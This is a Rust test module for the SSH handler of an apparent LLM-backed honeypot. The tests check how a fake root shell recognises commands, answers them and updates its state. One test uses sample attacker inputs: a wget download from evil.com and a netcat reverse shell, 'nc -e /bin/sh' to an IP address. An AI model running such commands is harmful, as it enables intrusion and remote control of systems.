// Tests for SSH protocol handler
#[cfg(test)]
mod tests {
    use crate::protocols::ssh::SshHandler;
    use crate::protocols::{LlmEscalationConfig, ProtocolHandler};
    use crate::handler::ChatService;

    // Mock ChatService for testing
    #[derive(Clone)]
    struct MockChatService {
        response: String,
    }

    #[async_trait::async_trait]
    impl ChatService for MockChatService {
        async fn send_message(&self, _message: &str) -> Result<String, String> {
            Ok(self.response.clone())
        }
    }

    #[test]
    fn test_ssh_handler_creation() {
        let mock_chat = MockChatService {
            response: "mock response".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        assert_eq!(handler.protocol_name(), "SSH");
        assert_eq!(handler.username, "root");
        assert_eq!(handler.hostname, "ubuntu-server");
        assert_eq!(handler.current_dir, "/root");
        assert!(!handler.authenticated);
    }

    #[test]
    fn test_ssh_is_known_command_exact_match() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        assert!(handler.is_known_command("ls"));
        assert!(handler.is_known_command("pwd"));
        assert!(handler.is_known_command("whoami"));
        assert!(handler.is_known_command("uname -a"));
    }

    #[test]
    fn test_ssh_is_known_command_cd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        assert!(handler.is_known_command("cd /tmp"));
        assert!(handler.is_known_command("cd .."));
        assert!(handler.is_known_command("cd"));
    }

    #[test]
    fn test_ssh_is_known_command_cat() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        assert!(handler.is_known_command("cat /etc/passwd"));
        assert!(handler.is_known_command("cat somefile.txt"));
    }

    #[test]
    fn test_ssh_is_known_command_unknown() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        assert!(!handler.is_known_command("wget http://evil.com/malware"));
        assert!(!handler.is_known_command("nc -e /bin/sh 1.2.3.4 443"));
    }

    #[test]
    fn test_ssh_get_native_response_ls() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut handler = SshHandler::new(mock_chat, config);

        let response = handler.get_native_response("ls");
        assert!(response.is_some());
        assert!(response.unwrap().contains(".bashrc"));
    }

    #[test]
    fn test_ssh_get_native_response_pwd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut handler = SshHandler::new(mock_chat, config);

        let response = handler.get_native_response("pwd");
        assert!(response.is_some());
        assert!(response.unwrap().contains("/root"));
    }

    #[test]
    fn test_ssh_get_native_response_whoami() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut handler = SshHandler::new(mock_chat, config);

        let response = handler.get_native_response("whoami");
        assert!(response.is_some());
        assert!(response.unwrap().contains("root"));
    }

    #[test]
    fn test_ssh_get_native_response_cd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut handler = SshHandler::new(mock_chat, config);

        assert_eq!(handler.current_dir, "/root");

        let response = handler.get_native_response("cd /tmp");
        assert!(response.is_some());
        assert_eq!(handler.current_dir, "/tmp");

        let response = handler.get_native_response("cd ..");
        assert!(response.is_some());
        assert_eq!(handler.current_dir, "/");
    }

    #[test]
    fn test_ssh_get_native_response_unknown() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut handler = SshHandler::new(mock_chat, config);

        let response = handler.get_native_response("unknown_command");
        assert!(response.is_none());
    }

    #[test]
    fn test_ssh_get_prompt() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let handler = SshHandler::new(mock_chat, config);

        let prompt = handler.get_prompt();
        assert_eq!(prompt, "root@ubuntu-server:/root# ");
    }
}
